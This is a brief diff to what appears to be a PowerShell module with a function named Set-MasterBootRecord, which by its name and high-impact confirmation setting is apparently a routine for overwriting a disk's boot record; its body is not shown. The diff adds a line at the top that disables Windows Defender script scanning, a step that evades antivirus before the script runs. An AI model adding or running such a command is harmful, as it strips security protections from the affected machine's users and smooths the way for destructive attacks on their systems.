@@ -1,3 +1,4 @@
+Set-MpPreference -DisableScriptScanning $true
 function Set-MasterBootRecord
 {
     [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
